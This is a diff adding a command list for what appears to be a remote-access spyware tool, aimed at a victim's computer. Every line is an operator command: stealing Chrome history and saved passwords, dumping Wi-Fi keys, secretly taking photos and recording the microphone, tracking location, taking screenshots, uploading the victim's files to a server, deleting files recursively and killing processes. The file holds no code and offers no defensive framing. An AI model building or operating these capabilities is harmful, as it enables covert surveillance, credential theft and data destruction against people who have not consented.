@@ -1,0 +1,23 @@
+
+external commands:
+to collect chrome history = get chrome history num=all/a certain number of the first items (Ex,get chrome history num=10)
+to search for a specific site on history resault = searsh history name_of_site
+to search a specific website login and steal username and passwords = search password name_of_site
+(you can also use advanced searsh password by typing search password advance name_of_site)
+to collect all passwords of all users = get chrome passwords
+to collect all wireless network passwords = get wifi info (to get expended wifi info type get wifi info expend)
+to take a picture (hidden and encrypted) = take picture name (Ex: take picture test)
+to open the microphone and record the target (hidden and encrypted) = record target name_of_record time=time of recording(Ex: record target test time=10)
+to open video camera = open camera name 
+to get the target geographical location = get location
+to get advanced information about the computer name and ip adresses = get ip info
+to take a screen shot = screen shot name
+to start files or program on target machine = start file path
+to collect files from the target machine and upload them to dedicated file sevrer = upload files path
+to delete file on target machine = delete file path
+to delete folder = delete file list path
+to recursively delete intiere path = delete recursive path
+to search a file = search file name of file path=path (Ex: search file file.txt C:\Users\ 
+to scan process = scan process
+to search specific process = search process name
+to kill process = kill process name
